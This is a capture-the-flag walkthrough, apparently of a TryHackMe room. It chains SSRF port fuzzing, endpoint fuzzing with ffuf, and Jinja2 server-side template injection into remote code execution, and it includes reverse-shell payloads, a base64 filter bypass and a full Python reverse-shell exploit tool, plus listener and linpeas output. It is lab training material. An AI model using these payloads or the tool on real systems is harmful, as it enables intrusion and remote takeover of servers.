
### Fuzzing API endpoint 
Added ThreadPoolExecutor for faster scanning. The current scan (ports 1 to 5000) only takes 1 minute and 19 seconds
```py
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

GREEN  = "\033[92m"
RESET  = "\033[0m"

URL = "http://storage.cloudsite.thm/api/store-url"
HEADERS = {
    "Host": "storage.cloudsite.thm",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "Referer": "http://storage.cloudsite.thm/dashboard/active",
    "Origin": "http://storage.cloudsite.thm",
    "Cookie": "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4NzgyNzgsImV4cCI6MTc1MTg4MTg3OH0.ZHv1rDMPsCJgL_5ShoZuVe4mXXz1paXO3of1VnEC-8c"  # Replace with your valid JWT
}

def check_port(port):
    json_data = {"url": f"http://127.0.0.1:{port}"}
    try:
        response = requests.post(URL, json=json_data, headers=HEADERS, timeout=3)
        if response.status_code in [200, 301, 302]:
            return f"{GREEN}[+] Port {port} - Status: {response.status_code}{RESET}"
    except requests.exceptions.RequestException:
        pass
    return None

def fuzz_ports(start=1, end=1000, threads=30):
    print(f"[*] Scanning ports {start} to {end}...\n")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_port, port) for port in range(start, end + 1)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)

if __name__ == "__main__":
    fuzz_ports(start=1, end=5000, threads=30)
```
### Output 
```bash
> python3 fuzz.py
[*] Scanning ports 1 to 5000...

[+] Port 80 - Status: 200
[+] Port 3000 - Status: 200
~/rabbit >                                                                                                                                  took 1m 19s
```
### Hidden Endpoint 
![chatbot](chatbot.png)


```bash
 
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4NzgyNzgsImV4cCI6MTc1MTg4MTg3OH0.ZHv1rDMPsCJgL_5ShoZuVe4mXXz1paXO3of1VnEC-8c" \
     -H "Origin: http://storage.cloudsite.thm" \
     -H "Referer: http://storage.cloudsite.thm/dashboard/active" \
     -u http://storage.cloudsite.thm/api/store-url \
     -d '{"url": "http://127.0.0.1:3000/api/FUZZ"}' \
     -mc 200,301,302 \
     -fw 5 \
     -t 100

```
![user_param](username_param.png)
![user_create](username_create.png)

### Fuzz username parameter 
```bash
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4ODE3NTksImV4cCI6MTc1MTg4NTM1OX0.AOrjl_6jUB-5b5y0CQBX_MiUmT0l692nsXzuxk9T-38" \
     -u http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot \
     -d '{"username": "FUZZ"}' \
     -mr "chatbot server is currently under development" \
     -t 50


root                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 307ms]
user                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 308ms]
ftp                     [Status: 200, Size: 282, Words: 37, Lines: 11, Duration: 351ms]
oracle                  [Status: 200, Size: 285, Words: 37, Lines: 11, Duration: 355ms]
guest                   [Status: 200, Size: 284, Words: 37, Lines: 11, Duration: 359ms]
mysql                   [Status: 200, Size: 284, Words: 37, Lines: 11, Duration: 365ms]
info                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 366ms]
pi                      [Status: 200, Size: 281, Words: 37, Lines: 11, Duration: 365ms]
adm                     [Status: 200, Size: 282, Words: 37, Lines: 11, Duration: 368ms]
azureuser               [Status: 200, Size: 288, Words: 37, Lines: 11, Duration: 371ms]
ansible                 [Status: 200, Size: 286, Words: 37, Lines: 11, Duration: 375ms]
puppet                  [Status: 200, Size: 285, Words: 37, Lines: 11, Duration: 380ms]
vagrant                 [Status: 200, Size: 286, Words: 37, Lines: 11, Duration: 384ms]
test                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 388ms]
ec2-user                [Status: 200, Size: 287, Words: 37, Lines: 11, Duration: 388ms]
admin                   [Status: 200, Size: 284, Words: 37, Lines: 11, Duration: 391ms]
administrator           [Status: 200, Size: 292, Words: 37, Lines: 11, Duration: 392ms]
:: Progress: [17/17] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```
### Security Testing
![xss](xss.png)
![ssti](ssti.png)

<br>

💥 That means the server is rendering the username value through a template engine (most likely Jinja2 or something similar) — and evaluating your expression.

- You're injecting directly into a server-side template.
- Likely template engine: Jinja2 (common in Python apps).

- 🚨 What This Means

- You can now:
    - Read server-side objects, environment, paths, etc.
    - Potentially execute arbitrary OS commands if not sandboxed
    - Escalate to Remote Code Execution (RCE)
### Exploitation SSTI to RCE 
![ssti_config](ssti_config.png)
### cleaning HTML Entity to json 
```json
{
  "DEBUG": true,
  "TESTING": false,
  "PROPAGATE_EXCEPTIONS": null,
  "SECRET_KEY": null,
  "PERMANENT_SESSION_LIFETIME": 31 days,
  "USE_X_SENDFILE": false,
  "SERVER_NAME": null,
  "APPLICATION_ROOT": "/",
  "SESSION_COOKIE_NAME": "session",
  "SESSION_COOKIE_DOMAIN": null,
  "SESSION_COOKIE_PATH": null,
  "SESSION_COOKIE_HTTPONLY": true,
  "SESSION_COOKIE_SECURE": false,
  "SESSION_COOKIE_SAMESITE": null,
  "SESSION_REFRESH_EACH_REQUEST": true,
  "MAX_CONTENT_LENGTH": null,
  "SEND_FILE_MAX_AGE_DEFAULT": null,
  "TRAP_BAD_REQUEST_ERRORS": null,
  "TRAP_HTTP_EXCEPTIONS": false,
  "EXPLAIN_TEMPLATE_LOADING": false,
  "PREFERRED_URL_SCHEME": "http",
  "TEMPLATES_AUTO_RELOAD": null,
  "MAX_COOKIE_SIZE": 4093
}
```
### Exploit SSTI vulnerability and save HTML output (polish)
```bash
#!/bin/bash

URL="http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot"
COOKIE="jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4ODE3NTksImV4cCI6MTc1MTg4NTM1OX0.AOrjl_6jUB-5b5y0CQBX_MiUmT0l692nsXzuxk9T-38"
REFERER="http://storage.cloudsite.thm/dashboard/active"
ORIGIN="http://storage.cloudsite.thm"

# JSON payload (escaped properly)
PAYLOAD=$(cat <<EOF
{ "username": "{{''.__class__.__mro__[2].__subclasses__()}}" }
EOF
)
# Output file
OUTPUT_FILE="ssti_response.html"

# Send POST request
curl -s -X POST "$URL" \
     -H "Content-Type: application/json" \
     -H "Cookie: $COOKIE" \
     -H "Referer: $REFERER" \
     -H "Origin: $ORIGIN" \
     -d "$PAYLOAD" \
     -o "$OUTPUT_FILE"

echo "[+] Response saved to $OUTPUT_FILE"

```
![user_ezrael](user_ezrael.png)

### Console Locked 
![console](console_locked.png)

### Jinja2 SSTI → RCE → Reverse Shell   
```bash
> echo 'bash -i >& /dev/tcp/10.23.93.75/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMy45My43NS80NDQ0IDA+JjEK
```
```json
{
  "username": "{{ config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.23.93.75 9001 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read() }}"
}
```
### Other payloads 
[payloads reference](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/)
```py
{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.0.0.1 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}

{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f')|attr('read')() }}

# Filter bypass - Base64 encode
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMy45My43NS80NDQ0IDA+JjEK" | base64 -d | bash').read() }}
```
### Exploit tool (sstijinja2)
```py
#!/usr/bin/env python3

import requests
import argparse

# Hardcoded JWT Token
JWT_TOKEN = "your token here"
# ANSI Colors
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[0m"

banner = rf"""{Y}
                 __  .__     __.__            __        
  ______ _______/  |_|__|   |__|__| ____     |__|____   
 /  ___//  ___/\\   __\\  |   |  |  |/    \\    |  \\__  \\  
 \\___ \\ \\___ \\  |  | |  |   |  |  |   |  \\   |  |/ __ \\_
/____  >____  > |__| |__/\__|  |__|___|  /\\__|  (____  /
     \\/     \\/          \\______|       \\/\\______|    \\/ 
{C}            Author: l0n3m4n | SSTI Jinja2 Reverse Shell
{W}"""

def send_payload(target_url, lhost, lport):
    fifo = "/tmp/ZTQ0Y"
    shell = f"mkfifo {fifo}; nc {lhost} {lport} 0<{fifo} | /bin/sh >{fifo} 2>&1; rm {fifo}"
    jinja_payload = f"{{{{ config.__class__.__init__.__globals__['os'].popen('{shell}').read() }}}}"

    headers = {
        "Content-Type": "application/json",
        "Cookie": f"jwt={JWT_TOKEN}",
        "Origin": "http://storage.cloudsite.thm",
        "Referer": "http://storage.cloudsite.thm/dashboard/active",
        "User-Agent": "Mozilla/5.0",
    }

    data = {
        "username": jinja_payload
    }

    try:
        print(f"{C}[*] Sending malicious payload to {target_url}...{W}")
        res = requests.post(target_url, json=data, headers=headers, timeout=10)

        # API Log
        print(f"{Y}--- API Request Log ---{W}")
        print(f"{G}[POST]{W} {target_url}")
        print(f"{G}Headers:{W} {headers}")
        print(f"{G}Payload:{W} {data}")
        print(f"{G}Response Status:{W} HTTP {res.status_code}\n")

        if res.status_code == 200:
            print(f"{G}[+] Payload may have executed. Check your listener!{W}")
        else:
            print(f"{Y}[-] Unexpected status code. Check manually.{W}")

    except Exception as e:
        print(f"{R}[!] Request failed: {e}{W}")

if __name__ == "__main__":
    print(banner)
    parser = argparse.ArgumentParser(
        description="Jinja2 SSTI RCE Exploit (Reverse Shell)",
        epilog="Example: python3 sstijinja.py -lhost 192.168.56.12 -lport 4444"
    )

    parser.add_argument(
        "-t", dest="target", default="http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot",
        help="Target URL (default: http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot)"
    )
    parser.add_argument("-lhost", dest="lhost", required=True, help="Your IP for reverse shell")
    parser.add_argument("-lport", dest="lport", required=True, help="Your port for reverse shell")

    args = parser.parse_args()

    send_payload(args.target, args.lhost, args.lport)

```
```bash
> rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.23.93.75] from (UNKNOWN) [10.10.18.211] 39948
ls
chatbot.py
__pycache__
templates
python3 -c 'import pty;pty.spawn("/bin/bash")'
azrael@forge:~/chatbotServer$ export TERM=linux 
```
```bash
azrael@forge:~/chatbotServer$ cat /etc/passwd | grep 100
cat /etc/passwd | grep 100
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
azrael:x:1000:1000:KLI:/home/azrael:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
azrael@forge:~/chatbotServer$ 
```
### Pivoting 
```bash
azrael@forge:/var/www/cloudsite.thm/assets$ ls
config-scss.bat  css  font  fonts  images  js  plugins  scss  webfonts
azrael@forge:/var/www/cloudsite.thm/assets$ cat *.bat
cat *.bat
cd E:\smarteye\consulting\3\html\assets
sass --watch scss/style.scss:css/style.css
azrael@forge:/var/www/cloudsite.thm/assets$ 
```

### Privilege Escalation
```bash
                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/local/bin/generate_erlang_cookie.sh
/usr/local/bin/change_cookie_permissions.sh
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

```
```bash
           ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root           1  0.2  0.3 166808 11964 ?        Ss   09:43   0:20 /sbin/init auto automatic-ubiquity noprompt
root         382  0.0  0.4  64340 16556 ?        S<s  09:44   0:00 /lib/systemd/systemd-journald
root         419  0.0  0.6 289316 27100 ?        SLsl 09:44   0:01 /sbin/multipathd -d -s
root         437  0.0  0.1  26664  7528 ?        Ss   09:44   0:00 /lib/systemd/systemd-udevd
systemd+     565  0.0  0.1  89364  6796 ?        Ssl  09:44   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+     586  0.0  0.2  16128  8172 ?        Ss   09:44   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     588  0.0  0.3  25540 12524 ?        Ss   09:44   0:00 /lib/systemd/systemd-resolved
  └─(Caps) 0x0000000000002000=cap_net_raw
root         599  0.0  0.4 1758900 18176 ?       Ssl  09:44   0:00 /usr/bin/amazon-ssm-agent
azrael       606  0.0  0.7  38276 29112 ?        Ss   09:44   0:00 /usr/bin/python3 /home/azrael/chatbotServer/chatbot.py
azrael       856  0.6  0.8 1071600 33116 ?       Sl   09:44   0:54  _ /usr/bin/python3 /home/azrael/chatbotServer/chatbot.py
azrael      6767  0.0  0.0   2892  1004 ?        S    11:35   0:00      _ /bin/sh -c mkfifo /tmp/ZTQ0Y; nc 10.23.93.75 9001 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y
azrael      6769  0.0  0.0   3536  2068 ?        S    11:35   0:00      |   _ nc 10.23.93.75 9001
azrael      6770  0.0  0.0   2892   984 ?        S    11:35   0:00      |   _ /bin/sh
azrael      6814  0.0  0.2  17348  9196 ?        S    11:36   0:00      |       _ python3 -c import pty; pty.spawn("/bin/bash")
azrael      6815  0.0  0.1   8700  5356 pts/1    Ss+  11:36   0:00      |           _ /bin/bash
azrael      6876  0.0  0.0   2892  1004 ?        S    11:37   0:00      _ /bin/sh -c mkfifo /tmp/ZTQ0Y; nc 10.23.93.75 9001 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y
azrael      6879  0.0  0.0   2892   960 ?        S    11:37   0:00      |   _ /bin/sh
azrael      6920  0.0  0.2  17480  9088 ?        S    11:38   0:00      |       _ python3 -c import pty;pty.spawn("/bin/bash")
azrael      6921  0.0  0.1   8700  5388 pts/2    Ss   11:38   0:00      |           _ /bin/bash
root       46840  0.0  0.1  11076  5164 pts/2    S+   11:55   0:00      |               _ sudo /usr/bin/pkexec /bin/s
azrael     47052  0.0  0.0   2892  1004 ?        S    11:59   0:00      _ /bin/sh -c mkfifo /tmp/ZTQ0YZ; nc 10.23.93.75 9001 0</tmp/ZTQ0YZ | /bin/sh >/tmp/ZTQ0YZ 2>&1; rm /tmp/ZTQ0YZ
azrael     47054  0.0  0.0   3536  2144 ?        S    11:59   0:00      |   _ nc 10.23.93.75 9001
azrael     47055  0.0  0.0   2892   980 ?        S    11:59   0:00      |   _ /bin/sh
azrael     47099  0.0  0.0   2892   968 ?        S    12:00   0:00      _ /bin/sh -c mkfifo /tmp/ZTQ0Y; nc 10.23.93.75 9001 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y
azrael     47101  0.0  0.0   3536  2212 ?        S    12:00   0:00      |   _ nc 10.23.93.75 9001
azrael     47102  0.0  0.0   2892   984 ?        S    12:00   0:00      |   _ /bin/sh
azrael     47109  0.0  0.2  17476  9300 ?        S    12:01   0:00      |       _ python3 -c import pty;pty.spawn("/bin/bash")
azrael     47110  0.0  0.1   8700  5340 pts/0    Ss   12:01   0:00      |           _ /bin/bash
azrael     47236  0.0  0.0   5776  1024 pts/0    S+   12:02   0:00      |               _ tee linpeas_result.txt
azrael     90164  0.0  0.0   2892   964 ?        S    12:07   0:00      _ /bin/sh -c mkfifo /tmp/ZTQ0Y; nc 10.23.93.75 9001 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y
azrael     90166  0.0  0.0   3536  2156 ?        S    12:07   0:00          _ nc 10.23.93.75 9001
azrael     90167  0.0  0.0   2892  1060 ?        S    12:07   0:00          _ /bin/sh
azrael     90208  0.0  0.2  17348  9176 ?        S    12:07   0:00              _ python3 -c import pty;pty.spawn("/bin/bash")
azrael     90209  0.0  0.1   8700  5352 pts/3    Ss   12:07   0:00                  _ /bin/bash
azrael     90325  0.5  0.0   4088  2948 pts/3    S+   12:09   0:00                      _ /bin/sh ./linpeas.sh
azrael     93661  0.0  0.0   4088  1284 pts/3    S+   12:09   0:00                          _ /bin/sh ./linpeas.sh
azrael     93663  0.0  0.0  10228  3516 pts/3    R+   12:09   0:00                          |   _ ps fauxwww
azrael     93665  0.0  0.0   4088  1284 pts/3    S+   12:09   0:00                          _ /bin/sh ./linpeas.sh
root         607  0.0  0.0   6896  2880 ?        Ss   09:44   0:00 /usr/sbin/cron -f -P
message+     608  0.0  0.1   8812  5136 ?        Ss   09:44   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
epmd         612  0.0  0.0   7140  1768 ?        Ss   09:44   0:00 /usr/bin/epmd -systemd
root         613  0.0  1.6 846140 66560 ?        Ssl  09:44   0:03 /usr/bin/node /root/forge_web_service/app.js
root         621  0.0  0.1  82700  4076 ?        Ssl  09:44   0:00 /usr/sbin/irqbalance --foreground
root         623  0.0  0.4  32744 19072 ?        Ss   09:44   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         624  0.0  0.2 236016  8724 ?        Ssl  09:44   0:00 /usr/libexec/polkitd --no-debug
syslog       630  0.0  0.1 222404  5648 ?        Ssl  09:44   0:00 /usr/sbin/rsyslogd -n -iNONE
root         635  0.0  0.7 1319708 28836 ?       Ssl  09:44   0:00 /usr/lib/snapd/snapd
root         650  0.0  0.1  14912  6328 ?        Ss   09:44   0:00 /lib/systemd/systemd-logind
root         652  0.0  0.3 392592 12520 ?        Ssl  09:44   0:00 /usr/libexec/udisks2/udisksd
daemon[0m       654  0.0  0.0   3864  1264 ?        Ss   09:44   0:00 /usr/sbin/atd -f
root         665  0.0  0.0   5800  1088 ttyS0    Ss+  09:44   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,57600,38400,9600 ttyS0 vt220
root         674  0.0  0.0   6176  1100 tty1     Ss+  09:44   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         704  0.0  0.3 317968 12012 ?        Ssl  09:44   0:00 /usr/sbin/ModemManager
root         748  0.0  0.1   7512  5320 ?        Ss   09:44   0:00 /usr/sbin/apache2 -k start
www-data     749  0.0  0.2 1214436 9344 ?        Sl   09:44   0:00  _ /usr/sbin/apache2 -k start
www-data     750  0.0  0.2 1214524 9512 ?        Sl   09:44   0:00  _ /usr/sbin/apache2 -k start
uuidd        877  0.0  0.0   9200  1540 ?        Ss   09:44   0:00 /usr/sbin/uuidd --socket-activation
rabbitmq    1151  0.0  0.0   2780  1584 ?        Ss   09:44   0:00  _ erl_child_setup 65536
rabbitmq    1250  0.0  0.0   3740  1236 ?        Ss   09:44   0:00      _ inet_gethost 4
rabbitmq    1251  0.0  0.0   3740   108 ?        S    09:44   0:00          _ inet_gethost 4
root        1277  0.0  1.0 690304 42420 ?        Ssl  09:45   0:00 /usr/bin/node /root/forge_web_service/rabbitmq/worker.js
azrael     27811  0.0  0.0   7372  1672 pts/2    S    11:43   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
azrael     27812  0.0  0.0   7372   248 pts/2    S    11:43   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
azrael     27818  0.0  0.0   7372  1996 pts/2    S    11:43   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
azrael     27827  0.0  0.0   5808  1116 pts/2    S    11:43   0:00  |       _ dd bs=9000 count=1
azrael     27828  0.0  0.0   2784   936 pts/2    S    11:43   0:00  |       _ xxd
azrael     27813  0.0  0.0   6612  2232 pts/2    S    11:43   0:00  _ grep accessible
azrael     29463  0.0  0.0  81388   828 ?        Ss   11:43   0:00 gpg-agent --homedir /home/azrael/.gnupg --use-standard-socket --daemon[0m
azrael     71452  0.0  0.0   7372  1548 pts/0    S+   12:04   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
azrael     71456  0.0  0.0   7372   244 pts/0    S+   12:04   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
azrael     71459  0.0  0.0   7372  1908 pts/0    S+   12:04   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
azrael     71465  0.0  0.0   5808  1112 pts/0    S+   12:04   0:00  |       _ dd bs=9000 count=1
azrael     71466  0.0  0.0   2784   944 pts/0    S+   12:04   0:00  |       _ xxd
azrael     71457  0.0  0.0   6612  2252 pts/0    S+   12:04   0:00  _ grep accessible


```

### Flags 
- user flags
```bash
azrael@forge:~$ cat user.txt 
cat user.txt 
98d3a30fa86523c580144d317be0c47e
```

